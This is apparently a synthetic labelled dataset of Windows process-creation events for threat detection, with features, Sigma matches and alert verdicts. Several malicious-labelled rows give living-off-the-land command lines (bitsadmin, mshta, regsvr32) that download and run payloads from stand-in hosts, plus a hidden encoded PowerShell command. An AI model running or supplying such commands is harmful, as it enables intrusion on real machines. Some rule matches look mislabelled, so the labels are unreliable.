UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label,parent_process_name,child_process_name,is_known_lolbin,is_scripting_engine,command_line_length,command_line_entropy,has_suspicious_flag,contains_url,contains_ip_address,has_base64_pattern,argument_count,suspicious_argument_ratio,has_encoded_command,has_download_indicator,process_ancestry_depth,parent_is_office_app,parent_is_browser,parent_is_script_engine,chain_hash,hour_of_day,is_off_hours,is_weekend,minute_of_hour,parent_child_pair_rarity,command_length_zscore,entropy_zscore,is_system_user,user_encoded,integrity_encoded,sigma_match,sigma_rule_name,sigma_level,sigma_mitre_tags,ml_anomaly_score,chain_risk_score,chain_description,chain_matched_pattern,final_verdict,priority,confidence,explanation
2024-07-01T09:25:24.386Z,{9631DBE3-5BE4-4616-BEFA-A3D9289161A7},37221,C:\Windows\System32\cmd.exe,cmd.exe /c ping google.com,C:\Windows\explorer.exe,C:\Windows\explorer.exe,32195,CORP\admin,High,0,,,benign,0,4,1,1,26,3.6322,0,0,0,0,4,0.0,0,0,1,0,0,0,2764436884,9,0,0,25,0.9208,-0.42900674299103336,-0.30042935496620965,0,3,2,False,None,none,,35.09872939064981,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,11.7,
2024-07-05T08:05:59.771Z,{66DA4D6F-A99F-46BE-8B70-73C277BDF0E1},56620,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",16491,CORP\dbadmin,Medium,0,,,benign,0,27,0,0,11,3.2776,0,0,0,0,1,0.0,0,0,1,0,0,0,3378330899,8,0,0,5,1.6478,-1.03041806494108,-0.831395491929045,0,4,1,False,None,none,,12.397542672236087,0,explorer.exe → acrobat.exe: No known suspicious pattern,False,CLEAR,NONE,4.1,
2024-07-02T20:18:10.448Z,{7A519B6C-385C-42F0-AE3C-2779DB0D084F},55640,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",36600,CORP\analyst01,Medium,0,,,benign,0,52,0,0,61,4.5873,0,0,0,0,3,0.0,0,0,1,0,0,0,2156223548,20,0,0,18,1.7891,0.9742863415590755,1.1297053247100566,0,13,1,False,None,none,,23.96737405137328,0,explorer.exe → outlook.exe: No known suspicious pattern,False,CLEAR,NONE,8.0,
2024-07-05T11:40:14.053Z,{349CE688-B4A7-4E8E-8B82-A0C12630CC63},7566,C:\Windows\System32\cmd.exe,cmd.exe /c whoami,C:\Windows\explorer.exe,C:\Windows\explorer.exe,28086,CORP\jsmith,Medium,0,,,benign,0,4,1,1,17,3.6169,0,0,0,0,3,0.0,0,0,1,0,0,0,2764436884,11,0,0,40,0.9208,-0.7898535361610614,-0.3233390613833883,0,9,1,False,None,none,,33.80157087402788,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,11.3,
2024-07-05T17:08:36.872Z,{0BF48F7A-A3D7-41D9-97E0-8B8C261D81AC},32807,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name Spooler -Force""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,52662,CORP\itops,High,0,,,benign,1,3,1,1,73,4.3563,1,0,0,0,7,0.1429,0,0,2,0,0,1,4082297620,17,0,0,8,1.3846,1.4554153991191128,0.7838136788036412,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,57.80222771839365,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.8,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 58 | Chain Risk: 5
2024-07-05T01:06:59.219Z,{FEF77EFE-22F9-4909-8329-DED44479337E},61324,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job9572 /download /priority high http://loader-cdn3972.net/svc840.exe C:\Users\Public\update542.exe,C:\Windows\System32\cmd.exe,cmd.exe,34042,CORP\mjones,Medium,1,T1197,BITSAdmin Download,malicious,1,24,1,0,123,4.9598,1,1,0,0,8,0.125,0,1,2,0,0,1,3692683671,1,1,0,6,3.9031,3.460119805619268,1.6874743208145586,0,0,1,True,BITSAdmin File Download,high,attack.t1197,90.95662996880586,85,"cmd.exe → bitsadmin.exe: Command shell invoking bitsadmin [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.1,Sigma rule matched: BITSAdmin File Download | ML Score: 91 | Chain Risk: 85
2024-07-04T12:23:26.266Z,{B37D0251-34B5-4F75-B052-2020106F9D73},11205,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --type=renderer --field-trial-handle=12345,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",20894,CORP\agarwal,Low,0,,,benign,5,13,0,0,53,4.2344,0,0,0,0,3,0.0,0,0,2,0,1,0,3035334175,12,0,0,23,1.727,0.6535336365190505,0.6012847106824633,0,12,0,False,None,none,,39.9128015797686,0,chrome.exe → chrome.exe: No known suspicious pattern,False,CLEAR,NONE,13.3,
2024-07-03T16:41:38.623Z,{504D7347-0B09-450B-9B51-78124D95C8EA},19525,C:\Users\itops\Downloads\installer.exe,installer.exe --silent --accept-license,C:\Windows\explorer.exe,C:\Windows\explorer.exe,20560,CORP\itops,High,0,,,benign,0,51,0,0,39,3.5665,0,0,0,0,3,0.0,0,0,1,0,0,0,1222512313,16,0,0,41,1.5809,0.09221640269900704,-0.39880632958115136,0,5,2,False,None,none,,4.93583170202222,0,explorer.exe → installer.exe: No known suspicious pattern,False,CLEAR,NONE,1.6,
2024-07-05T11:03:03.288Z,{790EC13D-3ABE-4BE8-9FEA-7DA34FCCAB8B},33433,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,40158,NT AUTHORITY\SYSTEM,System,0,,,benign,3,33,0,0,48,4.7147,0,0,0,0,4,0.0,0,0,1,0,0,0,2168783887,11,0,0,3,1.3349,0.453063195869035,1.3204698082099582,1,2,3,False,None,none,,24.625922997655422,0,services.exe → svchost.exe: No known suspicious pattern,False,CLEAR,NONE,8.2,
2024-07-05T17:46:35.297Z,{F6D0DC49-5C10-4BA2-8C89-C4460BBB6E05},3425,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://deploy.corp.local/package32.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,32948,CORP\itops,High,0,,,gray_area,1,12,0,0,71,4.3838,0,1,0,0,5,0.0,0,0,2,0,0,1,67440360,17,0,0,46,3.9031,1.3752272228591065,0.8249912556972618,0,5,2,False,None,none,,70.15120481938771,15,cmd.exe → msiexec.exe: No known suspicious pattern [Modifiers: +15 URL in command],False,ALERT,MEDIUM,50.1,"ANOMALY SCORE: 70/100 | Unusual factors: URL found in command line: 1.00 (baseline: 0.01±0.11, z=9.4); unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-04T16:16:35.881Z,{C33085C4-45EE-4B19-825C-B36838A2D924},62763,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",1752,CORP\analyst02,Medium,0,,,benign,0,35,0,0,8,2.5,0,0,0,0,1,0.0,0,0,1,0,0,0,2236906458,16,0,0,16,1.699,-1.1507003293310893,-1.9957476298373948,0,11,1,False,None,none,,19.888380462187655,0,explorer.exe → calc.exe: No known suspicious pattern,False,CLEAR,NONE,6.6,
2024-07-04T23:03:18.614Z,{066073A2-9880-4C15-B13A-43CC89BF16C6},21476,C:\Windows\System32\lsass.exe,C:\Windows\System32\lsass.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,24045,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign,3,46,0,0,29,4.1297,0,0,0,0,1,0.0,0,0,1,0,0,0,3252030755,23,0,0,3,1.6726,-0.30872447860102403,0.4445104452002044,1,15,3,False,None,none,,26.159340931131688,0,services.exe → lsass.exe: No known suspicious pattern,False,CLEAR,NONE,8.7,
2024-07-05T20:26:44.826Z,{0F29A547-D658-458D-8815-314DE1AD1E24},52920,C:\Windows\System32\mshta.exe,mshta.exe http://loader-cdn6172.org/payloads/script17.hta,C:\Windows\explorer.exe,cmd.exe,51630,CORP\agarwal,Medium,1,T1218.005,Mshta Remote HTA,malicious,0,5,1,1,57,4.4775,0,1,0,0,2,0.0,0,0,1,0,0,0,333442925,20,0,0,26,3.9031,0.813909989039063,0.9652944904220722,0,12,1,True,Mshta Remote HTA Execution,high,attack.t1218.005,79.46174399526238,55,explorer.exe → mshta.exe: Explorer launching HTA handler [Modifiers: +15 URL in command],True,ALERT,CRITICAL,97.9,Sigma rule matched: Mshta Remote HTA Execution | ML Score: 79 | Chain Risk: 55
2024-07-03T17:34:36.178Z,{8B2AEF9A-AC4E-4ED2-AD8B-45D88D1A4593},25684,C:\Windows\System32\mmc.exe,mmc.exe diskmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,43839,CORP\itops,High,0,,,benign,0,30,0,0,20,3.3414,0,0,0,0,2,0.0,0,0,1,0,0,0,2647570127,17,0,0,34,1.6021,-0.669571271771052,-0.7358635135358444,0,5,2,False,None,none,,8.19493944209474,0,explorer.exe → mmc.exe: No known suspicious pattern,False,CLEAR,NONE,2.7,
2024-07-06T02:19:36.411Z,{9BC882FE-6E85-4ECC-9F3A-B9A1229EF197},53730,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\helper630.csproj,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,15803,CORP\klee,Medium,1,T1127.001,MSBuild Inline Task,malicious,4,34,1,0,84,4.9667,0,0,0,0,2,0.0,0,0,2,0,0,1,3004846269,2,1,1,19,3.9031,1.896450368549147,1.6978061491987761,0,6,1,True,MSBuild Inline Task Execution,high,attack.t1127.001,81.45041697568783,80,powershell.exe → msbuild.exe: PowerShell spawning MSBuild [Modifiers: +10 off-hours],True,ALERT,CRITICAL,98.1,Sigma rule matched: MSBuild Inline Task Execution | ML Score: 81 | Chain Risk: 80
2024-07-05T01:20:34.578Z,{DAA877F1-EA35-498D-9C8A-FFEF23532BE6},10802,C:\Windows\System32\wininit.exe,wininit.exe,C:\Windows\System32\smss.exe,smss.exe,22419,NT AUTHORITY\SYSTEM,System,0,,,benign,8,40,0,0,11,2.6635,0,0,0,0,1,0.0,0,0,1,0,0,0,1062464593,1,1,0,20,2.2041,-1.03041806494108,-1.7509282181244123,1,2,3,False,None,none,,50.45718791341675,10,smss.exe → wininit.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,16.8,
2024-07-02T16:11:18.099Z,{1196433E-FEFD-4D31-9B89-DEC2D52DE0AE},31853,C:\Users\itops\Downloads\installer.exe,installer.exe --silent --accept-license,C:\Windows\explorer.exe,C:\Windows\explorer.exe,9384,CORP\itops,High,0,,,benign,0,51,0,0,39,3.5665,0,0,0,0,3,0.0,0,0,1,0,0,0,1222512313,16,0,0,11,1.5809,0.09221640269900704,-0.39880632958115136,0,5,2,False,None,none,,4.93583170202222,0,explorer.exe → installer.exe: No known suspicious pattern,False,CLEAR,NONE,1.6,
2024-07-04T15:30:41.204Z,{AC693A78-3945-43C6-87A4-9DE1BD99253A},50539,C:\Windows\System32\cmd.exe,cmd.exe /c net use Z: \\fileserver\share,C:\Windows\explorer.exe,C:\Windows\explorer.exe,64171,CORP\mjones,Medium,0,,,benign,0,4,1,1,40,4.0251,0,0,0,0,6,0.0,0,0,1,0,0,0,2764436884,15,0,0,30,0.9208,0.13231049082901014,0.28788591636119604,0,0,1,False,None,none,,34.277502845901786,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,11.4,
2024-07-05T19:37:38.040Z,{D90924BA-C791-4B2B-B678-67C6B15ABDB9},41591,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",6372,CORP\agarwal,Medium,0,,,benign,0,35,0,0,8,2.5,0,0,0,0,1,0.0,0,0,1,0,0,0,2236906458,19,0,0,37,1.699,-1.1507003293310893,-1.9957476298373948,0,12,1,False,None,none,,24.06370817810588,0,explorer.exe → calc.exe: No known suspicious pattern,False,CLEAR,NONE,8.0,
2024-07-04T18:58:13.751Z,{D6CFEB51-14E0-4A26-88D0-83661CC9221C},6059,C:\Windows\System32\dwm.exe,dwm.exe,C:\Windows\System32\smss.exe,smss.exe,48420,NT AUTHORITY\SYSTEM,System,0,,,benign,8,37,0,0,7,2.5216,0,0,0,0,1,0.0,0,0,1,0,0,0,3089833384,18,0,0,58,2.058,-1.1907944174610925,-1.9634045148954966,1,2,3,False,None,none,,39.998035110170136,0,smss.exe → dwm.exe: No known suspicious pattern,False,CLEAR,NONE,13.3,
2024-07-05T23:15:06.335Z,{0E496732-2D73-43E2-B08E-115DFAE29E3B},34846,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer wsus_update /download /priority normal http://internal-wsus.corp.local/update_kb7336179.cab C:\Windows\SoftwareDistribution\Download\update_kb7336179.cab,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS,39166,NT AUTHORITY\SYSTEM,System,0,,,gray_area,2,24,1,0,177,4.847,1,1,0,0,8,0.125,0,1,1,0,0,0,583731811,23,0,0,15,3.9031,5.625200564639437,1.5185713872290882,1,2,3,True,BITSAdmin File Download,high,attack.t1197,94.22713535838679,30,"svchost.exe → bitsadmin.exe: No known suspicious pattern [Modifiers: +15 URL in command, +10 LOLBin child, +5 suspicious flags]",False,ALERT,CRITICAL,99.4,Sigma rule matched: BITSAdmin File Download | ML Score: 94 | Chain Risk: 30
2024-07-01T08:18:55.904Z,{BB7C5735-4B37-41C2-A93A-E2E9C52204BE},43559,C:\Program Files\nodejs\node.exe,node.exe server.js,C:\Windows\System32\cmd.exe,cmd.exe,26331,CORP\mjones,Medium,0,,,benign,1,58,0,0,18,3.1916,0,0,0,0,2,0.0,0,0,2,0,0,1,12882278,8,0,0,18,2.6021,-0.7497594480310582,-0.9601690051236411,0,0,1,False,None,none,,58.43972934998425,0,cmd.exe → node.exe: No known suspicious pattern,False,CLEAR,NONE,19.5,
2024-07-04T21:19:36.135Z,{D936F078-E546-4AF9-88A4-C502AF1D8C1E},59869,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c installer593.exe"")",C:\Windows\System32\cmd.exe,explorer.exe,52730,CORP\pchen,Medium,1,T1218.011,Rundll32 JavaScript,malicious,1,1,1,0,141,5.1135,1,0,0,0,5,0.2,0,0,2,0,0,1,606078729,21,0,0,19,3.9031,4.181813391959324,1.9176195414890869,0,1,1,True,Rundll32 JavaScript Execution,critical,attack.t1218.011,92.93656497669613,55,cmd.exe → rundll32.exe: Command shell invoking rundll32 [Modifiers: +5 suspicious flags],True,ALERT,CRITICAL,99.3,Sigma rule matched: Rundll32 JavaScript Execution | ML Score: 93 | Chain Risk: 55
2024-07-02T16:29:23.061Z,{E0279CEA-923A-4DF9-ADF6-8F05EB99F633},41490,C:\Windows\System32\cmd.exe,cmd.exe /c netstat -an,C:\Windows\explorer.exe,C:\Windows\explorer.exe,42794,CORP\jsmith,Medium,0,,,benign,0,4,1,1,22,3.5383,0,0,0,0,4,0.0,0,0,1,0,0,0,2764436884,16,0,0,29,0.9208,-0.5893830955110458,-0.441032062977519,0,9,1,False,None,none,,32.16047748347257,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,10.7,
2024-07-02T13:07:47.548Z,{44CD4374-F85B-40C7-A111-8DBD4C33AD0F},63316,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",50950,CORP\klee,Medium,0,,,benign,0,42,0,0,59,4.4871,0,0,0,0,3,0.0,0,0,1,0,0,0,3033179346,13,0,0,7,1.699,0.8940981652990692,0.9796692081740269,0,6,1,False,None,none,,10.116967284411084,0,explorer.exe → excel.exe: No known suspicious pattern,False,CLEAR,NONE,3.4,
2024-07-02T11:32:35.108Z,{EC754A1D-42E4-4D87-BC68-BBDAE86C249F},21913,C:\Windows\System32\lsass.exe,C:\Windows\System32\lsass.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,16842,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign,3,46,0,0,29,4.1297,0,0,0,0,1,0.0,0,0,1,0,0,0,3252030755,11,0,0,32,1.6726,-0.30872447860102403,0.4445104452002044,1,7,3,False,None,none,,13.457097451081243,0,services.exe → lsass.exe: No known suspicious pattern,False,CLEAR,NONE,4.5,
2024-07-02T02:33:09.460Z,{266FC046-65D8-4A60-AA7B-101B3C5797F7},20377,C:\Windows\System32\conhost.exe,conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,54701,NT AUTHORITY\SYSTEM,System,0,,,benign,2,22,0,0,31,3.6797,0,0,0,0,3,0.0,0,0,1,0,0,0,26065344,2,1,0,33,1.8617,-0.22853630234101782,-0.2293044494226828,1,2,3,False,None,none,,29.148792805102644,10,svchost.exe → conhost.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,9.7,
2024-07-01T11:52:40.405Z,{5C90C9E2-4E58-4445-827C-6121457CC4B6},8270,C:\Windows\System32\wbem\WMIC.exe,"wmic.exe service where state='running' get name,pathname",C:\Windows\System32\cmd.exe,cmd.exe,58010,CORP\admin,High,0,,,gray_area,1,50,0,0,56,4.0448,0,0,0,0,6,0.0,0,0,2,0,0,1,579512134,11,0,0,52,3.9031,0.7738159009090598,0.31738403508135393,0,3,2,False,None,none,,63.81349242701949,0,cmd.exe → wmic.exe: No known suspicious pattern,False,CLEAR,NONE,21.3,
2024-07-05T21:13:30.398Z,{4FDE7AD3-B188-4B92-AD1E-1DB4542B44BF},45659,C:\Windows\System32\schtasks.exe,"schtasks.exe /run /tn ""\Microsoft\Windows\WindowsUpdate\Automatic App Update""",C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,63994,NT AUTHORITY\SYSTEM,System,0,,,benign,2,15,0,0,77,4.5118,0,0,0,0,6,0.0,0,0,1,0,0,0,1801100127,21,0,0,13,1.8239,1.6157917516391251,1.0166541590566611,1,2,3,False,None,none,,40.79158549442978,0,svchost.exe → schtasks.exe: No known suspicious pattern,False,CLEAR,NONE,13.6,
2024-07-02T08:35:16.556Z,{A41865FA-DA70-4347-B72A-32F5D5E8473C},59588,C:\Windows\System32\eventvwr.exe,eventvwr.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,36368,CORP\itops,High,0,,,benign,0,57,0,0,12,2.7516,0,0,0,0,1,0.0,0,0,1,0,0,0,2261623577,8,0,0,35,2.1249,-0.9903239768110769,-1.6190102354215763,0,5,2,False,None,none,,17.91157296485597,0,explorer.exe → eventvwr.exe: No known suspicious pattern,False,CLEAR,NONE,6.0,
2024-07-04T12:56:28.799Z,{9B52F891-EA23-4F7B-9B6B-98C3B27BC6AA},57544,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe -contentproc -childID 7,C:\Program Files\Mozilla Firefox\firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe""",62523,CORP\netadmin,Low,0,,,benign,11,10,0,0,35,4.0931,0,0,0,0,4,0.0,0,0,2,0,1,0,2019625803,12,0,0,56,1.727,-0.0681599498210054,0.3897068337708762,0,8,0,False,None,none,,38.1257374388995,0,firefox.exe → firefox.exe: No known suspicious pattern,False,CLEAR,NONE,12.7,
2024-07-07T03:38:10.808Z,{BE16B100-A3DC-4DEA-8DB8-3C35F5D638B1},53072,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s /n /u /i:http://cobaltstrike987.top/file140.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,42811,CORP\klee,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious,1,19,1,0,74,4.6655,1,1,0,0,6,0.1667,0,0,2,0,0,1,2398546659,3,1,1,38,3.9031,1.495509487249116,1.2467993797311892,0,6,1,True,Regsvr32 Squiblydoo Remote SCT Execution,critical,attack.t1218.010,90.08851883647444,85,"cmd.exe → regsvr32.exe: Command shell invoking regsvr32 [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: Regsvr32 Squiblydoo Remote SCT Execution | ML Score: 90 | Chain Risk: 85
2024-07-04T20:19:50.281Z,{60DF64D8-A1F5-4677-B570-160C335AC7D7},39759,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalService -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,4681,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign,3,33,0,0,50,4.6713,0,0,0,0,4,0.0,0,0,1,0,0,0,2168783887,20,0,0,19,1.3349,0.5332513721290413,1.2554841050396617,1,7,3,False,None,none,,29.68917372611402,0,services.exe → svchost.exe: No known suspicious pattern,False,CLEAR,NONE,9.9,
2024-07-02T17:44:22.881Z,{995A3528-751F-4C4B-9555-E996988C00CE},47579,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ChildItem -Path C:\Logs -Recurse -Filter *.log""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,40994,CORP\admin,High,0,,,benign,0,3,1,1,87,4.6553,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,17,0,0,44,1.231,2.0167326329391564,1.2315262421197382,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.415470140573674,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.1,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 41 | Chain Risk: 5
2024-07-04T02:49:03.943Z,{D9734479-D0EA-4737-9F9F-7BA4B3B6D127},51521,C:\Windows\System32\dwm.exe,dwm.exe,C:\Windows\System32\smss.exe,smss.exe,22914,NT AUTHORITY\SYSTEM,System,0,,,benign,8,37,0,0,7,2.5216,0,0,0,0,1,0.0,0,0,1,0,0,0,3089833384,2,1,0,49,2.058,-1.1907944174610925,-1.9634045148954966,1,2,3,False,None,none,,53.39628831073833,10,smss.exe → dwm.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,17.8,
2024-07-05T11:29:44.262Z,{B21E07FD-95B0-4E01-AC83-69C1FC3085EC},51259,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",25175,CORP\helpdesk,Medium,0,,,benign,0,52,0,0,61,4.5873,0,0,0,0,3,0.0,0,0,1,0,0,0,2156223548,11,0,0,29,1.7891,0.9742863415590755,1.1297053247100566,0,14,1,False,None,none,,13.776594045421325,0,explorer.exe → outlook.exe: No known suspicious pattern,False,CLEAR,NONE,4.6,
2024-07-04T01:25:12.502Z,{01F598D3-9C47-430D-9CE6-2713F53BC67D},21824,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,WINWORD.EXE /n,40529,CORP\jsmith,Medium,1,T1059.001,PowerShell Encoded Command,malicious,10,3,1,1,238,4.8054,1,0,0,1,6,0.5,1,0,2,1,0,0,3072976960,1,1,0,25,3.9031,8.070939940569627,1.4562809436372823,0,9,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"winword.exe → powershell.exe: Office Word directly spawning PowerShell [Modifiers: +20 Office→Script chain, +10 off-hours, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-05T19:43:41.570Z,{6DBFE3BC-AF70-458B-8932-57C9B54EB118},2720,C:\Windows\System32\SearchIndexer.exe,C:\Windows\System32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,40911,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign,3,6,0,0,48,4.5608,0,0,0,0,2,0.0,0,0,1,0,0,0,2706394319,19,0,0,43,2.2041,0.453063195869035,1.0900251142489317,1,15,3,False,None,none,,30.936894916229264,0,services.exe → searchindexer.exe: No known suspicious pattern,False,CLEAR,NONE,10.3,
2024-07-01T10:06:26.933Z,{7CAC05F1-0D4B-4931-9DE3-93F998D392FC},39715,C:\Users\sysadmin\Downloads\installer.exe,installer.exe --silent --accept-license,C:\Windows\explorer.exe,C:\Windows\explorer.exe,32632,CORP\sysadmin,High,0,,,benign,0,51,0,0,39,3.5665,0,0,0,0,3,0.0,0,0,1,0,0,0,1222512313,10,0,0,6,1.5809,0.09221640269900704,-0.39880632958115136,0,10,2,False,None,none,,2.600915587237074,0,explorer.exe → installer.exe: No known suspicious pattern,False,CLEAR,NONE,0.9,
2024-07-02T16:56:36.029Z,{7B4A227E-FC5D-4FB7-B7D5-9BEF03E59957},12386,C:\Users\admin\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,13632,CORP\admin,High,0,,,benign,0,23,0,0,18,3.5305,0,0,0,0,3,0.0,0,0,1,0,0,0,2635501913,16,0,0,56,1.6726,-0.7497594480310582,-0.4527115211509824,0,3,2,False,None,none,,4.946264153680943,0,explorer.exe → setup.exe: No known suspicious pattern,False,CLEAR,NONE,1.6,
2024-07-01T13:52:28.104Z,{E6E37AAD-4433-46C3-8427-73FBEB6D5DED},41377,C:\Windows\System32\mmc.exe,mmc.exe compmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,57887,CORP\itops,High,0,,,benign,0,30,0,0,20,3.1087,0,0,0,0,2,0.0,0,0,1,0,0,0,2647570127,13,0,0,52,1.6021,-0.669571271771052,-1.0843006823775025,0,5,2,False,None,none,,7.5687314825627485,0,explorer.exe → mmc.exe: No known suspicious pattern,False,CLEAR,NONE,2.5,
